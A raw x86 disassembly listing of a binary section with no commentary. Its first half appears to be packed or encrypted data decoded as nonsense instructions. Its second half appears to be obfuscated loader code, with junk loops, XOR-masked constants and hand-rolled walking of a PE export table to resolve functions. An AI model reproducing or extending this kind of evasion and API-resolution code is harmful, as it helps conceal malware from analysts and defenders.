  407df0:	push   edx
  407df1:	(bad)  
  407df2:	hlt    
  407df3:	jmp    0x407dbd
  407df5:	add    bh,BYTE PTR [edi-0xd]
  407df8:	jns    0x407e29
  407dfa:	mov    ebp,0xe6694fab
  407dff:	sub    al,0x27
  407e01:	not    BYTE PTR [ebx-0x41]
  407e04:	stc    
  407e05:	in     al,0x5a
  407e07:	dec    eax
  407e08:	sbb    ch,BYTE PTR [edx+0x51]
  407e0b:	push   eax
  407e0c:	push   edx
  407e0d:	add    DWORD PTR [ebp+0xac1995c],0xffffffef
  407e14:	loop   0x407de0
  407e16:	fnsave [ecx-0x7e]
  407e19:	pushf  
  407e1a:	data16 mov dh,0xf5
  407e1d:	hlt    
  407e1e:	(bad)  
  407e1f:	nop
  407e20:	push   cs
  407e21:	add    edx,edx
  407e23:	or     bl,cl
  407e25:	dec    edi
  407e26:	or     bh,BYTE PTR [esi+0x67]
  407e29:	mov    al,ds:0x1081b2b7
  407e2e:	add    BYTE PTR [edx-0x62],ch
  407e31:	into   
  407e32:	std    
  407e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e34:	push   ss
  407e35:	xor    eax,0xdf8e7333
  407e3a:	addr16 ds fucomi st,st(1)
  407e3e:	out    0x22,al
  407e40:	bound  ebp,QWORD PTR [ebx+eiz*1-0x3d]
  407e44:	stc    
  407e45:	mov    al,0x69
  407e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e48:	stos   DWORD PTR es:[edi],eax
  407e49:	in     al,dx
  407e4a:	sub    al,0x63
  407e4c:	jp     0x407e29
  407e4e:	xor    BYTE PTR [ecx-0x1420ff48],cl
  407e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e55:	and    edi,DWORD PTR [ecx]
  407e57:	mov    dl,0xe0
  407e59:	lds    esi,FWORD PTR [ecx-0x1afe4f8f]
  407e5f:	stos   BYTE PTR es:[edi],al
  407e60:	dec    eax
  407e61:	cmp    cl,dh
  407e63:	jp     0x407df4
  407e65:	(bad)  
  407e67:	jle    0x407e69
  407e69:	xchg   ecx,eax
  407e6a:	pop    ss
  407e6b:	xchg   edx,eax
  407e6c:	xor    dl,BYTE PTR [eax-0x7522c2cd]
  407e72:	mov    dh,0x30
  407e74:	mov    eax,0x2445a49a
  407e79:	ret    
  407e7a:	repnz xor BYTE PTR [esi],0x7c
  407e7e:	sbb    DWORD PTR [edx+edi*2+0x11],edi
  407e82:	inc    edx
  407e83:	mov    ebx,0xdd611845
  407e88:	jbe    0x407eb7
  407e8a:	addr16 jno 0x407e43
  407e8d:	rcl    eax,0xfa
  407e90:	aas    
  407e91:	cwde   
  407e92:	cld    
  407e93:	mov    ebp,0x44ee4c6
  407e98:	mov    dh,0xa8
  407e9a:	mov    bl,0x92
  407e9c:	or     DWORD PTR [ebx],ebx
  407e9e:	inc    ebx
  407e9f:	push   eax
  407ea0:	adc    BYTE PTR [edx+ecx*4],0x53
  407ea4:	jb     0x407e81
  407ea6:	jae    0x407e6a
  407ea8:	pop    esi
  407ea9:	sbb    DWORD PTR [edi+ebx*2],ebx
  407eac:	retf   0xb788
  407eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb0:	add    dl,BYTE PTR [eax-0x31]
  407eb3:	icebp  
  407eb4:	cli    
  407eb5:	sbb    al,0xd9
  407eb7:	xchg   esi,eax
  407eb8:	fmul   QWORD PTR [ebp+0x38941523]
  407ebe:	div    ecx
  407ec0:	lods   eax,DWORD PTR ds:[esi]
  407ec1:	mov    DWORD PTR [edi+0x72b61e78],esi
  407ec7:	(bad)  
  407ec8:	data16 cmp BYTE PTR [edx],cl
  407ecb:	mov    ebp,0x64d67f8e
  407ed0:	dec    esi
  407ed1:	jl     0x407f0f
  407ed3:	int3   
  407ed4:	cwde   
  407ed5:	fwait
  407ed6:	jne    0x407e65
  407ed8:	pop    ds
  407ed9:	sahf   
  407eda:	call   0x8f76d0c
  407edf:	shr    DWORD PTR [edx-0x5b],0x1
  407ee3:	pop    edx
  407ee4:	adc    bl,BYTE PTR [edi]
  407ee6:	sub    edi,DWORD PTR [ecx]
  407ee8:	add    dh,BYTE PTR [edi]
  407eea:	cdq    
  407eeb:	jo     0x407ea3
  407eed:	jecxz  0x407e8f
  407eef:	cs jmp 0x407f15
  407ef2:	idiv   cl
  407ef4:	fistp  QWORD PTR [ebp-0x24]
  407ef7:	pop    ds
  407ef8:	(bad)  
  407ef9:	and    ch,BYTE PTR [ebp+edi*8-0xd]
  407efd:	cmc    
  407efe:	or     DWORD PTR [edx+0x5a],ecx
  407f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f02:	mov    ds:0xb5edb827,eax
  407f07:	dec    eax
  407f08:	sti    
  407f09:	test   al,0x32
  407f0b:	or     eax,0x1fec5cc0
  407f10:	(bad)  
  407f11:	pop    eax
  407f12:	je     0x407f8f
  407f14:	mov    bl,0xba
  407f16:	(bad)  
  407f17:	stos   DWORD PTR es:[edi],eax
  407f18:	sar    ecx,1
  407f1a:	in     eax,0x12
  407f1c:	push   cs
  407f1d:	dec    esp
  407f1e:	mov    ah,0x9b
  407f20:	ins    BYTE PTR es:[edi],dx
  407f21:	xor    edi,0xd084a344
  407f27:	call   0x5660:0xbf75df
  407f2e:	out    0xb,al
  407f30:	xor    DWORD PTR [di],esi
  407f33:	mov    esi,0xd785614b
  407f38:	lods   al,BYTE PTR ds:[esi]
  407f39:	adc    ebx,ebp
  407f3b:	add    esi,DWORD PTR [edx+0x439068f3]
  407f41:	mov    ebx,fs
  407f43:	mov    bl,0xfc
  407f45:	sub    BYTE PTR [ebp+0x130c6d72],dl
  407f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f4c:	fbld   TBYTE PTR [esp+ebx*2+0x76ac86e1]
  407f53:	inc    edi
  407f54:	out    0xf8,eax
  407f56:	adc    ch,BYTE PTR [edi+edi*8-0x7e]
  407f5a:	sub    ecx,DWORD PTR [eax+0x360bbcef]
  407f60:	inc    esp
  407f61:	pop    edi
  407f62:	call   0xe5233e89
  407f67:	xor    al,0xe5
  407f69:	lock mov ds:0xc92c92b,eax
  407f6f:	ins    DWORD PTR es:[edi],dx
  407f70:	ss fwait
  407f72:	mov    ebx,0x2af98653
  407f77:	call   0x3f396cf7
  407f7c:	dec    edi
  407f7d:	jo     0x407f7e
  407f7f:	rcr    DWORD PTR [ecx+0x45],1
  407f82:	das    
  407f83:	sbb    dl,bh
  407f85:	ss push es
  407f87:	mov    cl,BYTE PTR [edx-0x8]
  407f8a:	scas   eax,DWORD PTR es:[edi]
  407f8b:	arpl   sp,bx
  407f8d:	mov    ?,WORD PTR [edi-0x23]
  407f90:	retf   0xbb21
  407f93:	sub    al,0x3e
  407f95:	sar    BYTE PTR [ebx-0x3c68a36a],1
  407f9b:	push   ds
  407f9c:	and    esp,esi
  407f9e:	ss int 0xd7
  407fa1:	es ret 
  407fa3:	inc    esi
  407fa4:	clc    
  407fa5:	ret    0xb69a
  407fa8:	mov    esi,0xe54fd68b
  407fad:	sub    eax,0xcb1618fb
  407fb2:	sub    DWORD PTR [ecx-0x6a],edx
  407fb5:	in     eax,0x5f
  407fb7:	jge    0x407f58
  407fb9:	mov    cl,0xa0
  407fbb:	mov    BYTE PTR [ebx+eax*1-0x61d35dfb],ch
  407fc2:	imul   ebx,ebp,0x40
  407fc5:	scas   al,BYTE PTR es:[edi]
  407fc6:	fbstp  TBYTE PTR [edx]
  407fc8:	rcr    DWORD PTR [ecx],cl
  407fca:	out    dx,al
  407fcb:	gs sub al,0x9b
  407fce:	aaa    
  407fcf:	xchg   DWORD PTR [eax-0x7c4e73ae],ebx
  407fd5:	les    edx,FWORD PTR [esi+0x2c]
  407fd8:	sbb    ch,BYTE PTR [edx-0x99912a6]
  407fde:	jne    0x40802b
  407fe0:	sub    BYTE PTR [esi-0x63],dl
  407fe3:	push   edx
  407fe4:	jge    0x408060
  407fe6:	out    dx,al
  407fe7:	lea    ebx,[eax]
  407fe9:	xchg   esi,eax
  407fea:	pop    esp
  407feb:	outs   dx,BYTE PTR ds:[esi]
  407fec:	or     ebp,ebx
  407fee:	(bad)  
  407fef:	fdiv   QWORD PTR [ebp+ecx*4+0x6ac316e]
  407ff6:	jb     0x408058
  407ff8:	int3   
  407ff9:	nop
  407ffa:	ins    DWORD PTR es:[edi],dx
  407ffb:	sub    edx,DWORD PTR [ecx+esi*2-0x3833532d]
  408002:	aas    
  408003:	test   eax,ebp
  408005:	adc    bl,BYTE PTR ds:0x13e8119c
  40800b:	push   edx
  40800c:	std    
  40800d:	pop    esi
  40800e:	inc    DWORD PTR [ecx+0x28b11753]
  408014:	pop    esp
  408015:	jl     0x408058
  408017:	cmp    al,0xb1
  408019:	cmc    
  40801a:	xchg   BYTE PTR [ecx],bh
  40801c:	pop    ebp
  40801d:	into   
  40801e:	push   ebp
  40801f:	loope  0x407fb2
  408021:	aad    0x9f
  408023:	inc    BYTE PTR [esi+0x382164ad]
  408029:	stc    
  40802a:	es stos DWORD PTR es:[edi],eax
  40802c:	ss test edx,edi
  40802f:	je     0x407fb8
  408031:	or     al,0x16
  408033:	mov    ecx,0x99f53dc6
  408038:	fdiv   DWORD PTR ds:0xcc5ee2b7
  40803e:	xchg   DWORD PTR [edx+0x26],edi
  408041:	nop
  408042:	stos   BYTE PTR es:[edi],al
  408043:	popa   
  408044:	push   edi
  408045:	mov    ds:0x25c777bf,al
  40804a:	dec    esp
  40804b:	loop   0x408058
  40804d:	sbb    edi,eax
  40804f:	xchg   ecx,eax
  408050:	mov    cr1,edi
  408053:	pop    edx
  408054:	retf   0x61bf
  408057:	add    eax,0xc7060b1f
  40805c:	pop    esi
  40805d:	xchg   esp,eax
  40805e:	stos   DWORD PTR es:[edi],eax
  40805f:	push   ebp
  408060:	test   BYTE PTR [esp+ecx*8],cl
  408063:	lods   al,BYTE PTR ds:[esi]
  408064:	stos   BYTE PTR es:[edi],al
  408065:	cli    
  408066:	and    cl,ch
  408068:	jbe    0x408020
  40806a:	xlat   BYTE PTR ds:[ebx]
  40806b:	cmp    eax,0xdec744cc
  408070:	adc    BYTE PTR [ecx],0xf5
  408073:	xor    bl,bl
  408075:	aad    0xd5
  408077:	adc    eax,0x334cdaa4
  40807c:	push   ds
  40807d:	mov    ds:0x84b3ac61,eax
  408082:	addr16 aam 0x9b
  408085:	and    eax,0xda40acf5
  40808a:	xchg   ebp,eax
  40808b:	push   eax
  40808c:	jae    0x40807b
  40808e:	fist   WORD PTR [eax]
  408090:	cwde   
  408091:	mov    DWORD PTR [edi+0xb79f987],edi
  408097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408099:	adc    eax,esi
  40809b:	xchg   BYTE PTR [esi-0x3b99a8f2],bl
  4080a1:	ins    DWORD PTR es:[edi],dx
  4080a2:	cmp    ch,ch
  4080a4:	and    ah,bh
  4080a6:	repnz sbb eax,0x54073009
  4080ac:	les    ebp,FWORD PTR [eax-0x16]
  4080af:	xchg   ebp,eax
  4080b0:	xchg   ebp,eax
  4080b1:	ja     0x408116
  4080b3:	add    DWORD PTR [esi+0x56],edx
  4080b6:	sbb    bh,BYTE PTR [ebx-0x1db5b9a8]
  4080bc:	call   0x777fcfd9
  4080c1:	adc    esp,ebx
  4080c3:	lahf   
  4080c4:	dec    edi
  4080c5:	retf   
  4080c6:	inc    ecx
  4080c7:	fcmovu st,st(1)
  4080c9:	dec    ebx
  4080ca:	jl     0x408131
  4080cc:	inc    BYTE PTR [ebx+0x76]
  4080cf:	mov    ah,0xab
  4080d1:	stc    
  4080d2:	pop    eax
  4080d3:	aam    0x21
  4080d5:	adc    al,0x55
  4080d7:	out    0xce,al
  4080d9:	fld    DWORD PTR [edx+0x778a6a30]
  4080df:	inc    ecx
  4080e0:	(bad)  
  4080e1:	sub    ch,BYTE PTR [ebx]
  4080e3:	std    
  4080e4:	clc    
  4080e5:	inc    ebp
  4080e6:	mov    eax,0x3931fd7f
  4080eb:	mov    BYTE PTR ds:0x36b0a157,bl
  4080f1:	mov    dh,0x8b
  4080f3:	lgs    esp,FWORD PTR [esi-0x16]
  4080f7:	inc    ebx
  4080f8:	jo     0x408158
  4080fa:	icebp  
  4080fb:	rol    DWORD PTR [ecx],1
  4080fd:	cli    
  4080fe:	jmp    0x408103
  408100:	into   
  408101:	xchg   edx,eax
  408102:	mov    ds:0xeb638446,eax
  408107:	inc    edx
  408108:	push   esp
  408109:	jns    0x408177
  40810b:	xchg   ebp,eax
  40810c:	retf   0xff13
  40810f:	arpl   WORD PTR [edx+0x71],bx
  408112:	mov    esp,0x9be0a033
  408117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408118:	mov    ebp,0xab4b0925
  40811d:	mov    ebp,0x74bc1dc7
  408122:	xchg   BYTE PTR [ebp-0x31],ch
  408125:	jmp    0x408160
  408127:	neg    DWORD PTR [ecx+0x5b268c46]
  40812d:	add    DWORD PTR [ecx],0xfec42e19
  408133:	jge    0x408133
  408135:	adc    al,BYTE PTR [edx]
  408137:	rol    DWORD PTR [ebp+ebx*2+0x4f],cl
  40813b:	stos   BYTE PTR es:[edi],al
  40813c:	xor    ah,bh
  40813e:	mov    WORD PTR [esi+0x5ce0e965],gs
  408144:	inc    ecx
  408145:	mov    ebp,0xe9cfc348
  40814a:	cmp    BYTE PTR [esi-0x6],dl
  40814d:	into   
  40814e:	sbb    ecx,DWORD PTR [edi]
  408150:	add    bh,ah
  408152:	fcom   QWORD PTR [ebp-0x2c]
  408155:	(bad)  
  408157:	ss mov ebx,0xd6e44a3a
  40815d:	inc    eax
  40815e:	aaa    
  40815f:	std    
  408160:	and    esp,edi
  408162:	imul   ebx,DWORD PTR [ecx],0x6b
  408165:	ret    0x710b
  408168:	jns    0x40819b
  40816a:	mov    dl,0x17
  40816c:	mov    al,ds:0xa9507e68
  408171:	push   0x15b189c8
  408176:	addr16 enter 0x5527,0xbd
  40817b:	xchg   edx,eax
  40817c:	ret    0x7f8c
  40817f:	call   0x4145:0x98c556db
  408186:	bound  ebx,QWORD PTR [ebp-0x10eab6dc]
  40818c:	pop    ds
  40818d:	xor    al,0x9d
  40818f:	mov    esi,DWORD PTR [eax+edx*8-0xe71ae72]
  408196:	mov    al,0x21
  408198:	jb     0x40820a
  40819a:	push   ebp
  40819b:	mov    al,BYTE PTR [edi+0x1c3d31ce]
  4081a1:	add    BYTE PTR [edx+0x0],0xbf
  4081a5:	pop    esp
  4081a6:	adc    eax,0xd72b0000
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x423532
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x42379e
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x4236be
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
